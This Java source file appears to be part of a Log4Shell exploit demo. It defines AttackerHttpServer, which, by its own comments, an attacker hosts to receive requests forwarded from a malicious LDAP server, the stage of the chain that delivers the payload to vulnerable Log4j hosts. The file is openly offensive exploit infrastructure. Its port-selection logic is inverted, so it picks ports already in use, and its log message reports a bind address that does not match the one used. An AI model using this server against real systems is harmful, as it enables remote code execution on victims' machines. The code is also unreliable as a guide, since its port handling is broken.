package com.demo.exploit.log4jshell.attacker.server.http;

import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Random;

/**
 * A simple HTTP server that an attacker will host in their network
 * This server will get the forwarding requests from LDAP server.
 *
 * @author karanratra on 12/20/21
 */

public class AttackerHttpServer {

    public static int getAvailablePort(String host){
        int port = 65535;
        for(int i=0;i<100;i++){
            int n = getRandomNum(10000,65535);
            if(isPortUsing(host,n)){
                port = n;
                break;
            }
        }
        return port;
    }

    public static boolean isPortUsing(String host,int port) {
        boolean flag = false;
        try {
            InetAddress theAddress = InetAddress.getByName(host);
            Socket socket = new Socket(theAddress,port);
            flag = true;
        } catch (IOException e) {
            flag = false;
        }
        return flag;
    }

    public static int getRandomNum(int min,int max){
        return  new Random().nextInt(max-min) + min;
    }

    public static void startHttpServer(String ip, int port) throws IOException {
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(ip, port), 0);
        httpServer.createContext("/", new AttackerHttpFileHandler());
        httpServer.setExecutor(null);
        httpServer.start();
        System.out.println(String.format("[*] HTTP server listening on: 0.0.0.0:%d (http://%s:%d/)",port,ip,port));
    }
}